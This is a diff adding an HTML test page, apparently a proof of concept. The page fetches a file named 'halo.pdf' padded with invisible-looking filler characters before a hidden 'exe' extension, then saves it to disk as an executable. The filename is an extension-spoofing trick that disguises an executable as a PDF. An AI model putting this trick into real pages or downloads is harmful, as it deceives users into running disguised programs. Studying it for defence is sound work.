@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<button onclick="saveExe()">Test_Fake_Extension</button>
+
+<script>
+async function saveExe() {
+  const response = await fetch("halo.pdfㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤexe");
+  const blob = await response.blob();
+
+  const handle = await window.showSaveFilePicker({
+    suggestedName: "app.exe",
+    types: [{
+      description: "Executable",
+      accept: { "application/octet-stream": [".exe"] }
+    }]
+  });
+
+  const writable = await handle.createWritable();
+  await writable.write(blob);
+  await writable.close();
+}
+</script>
+
+</body>
+</html>
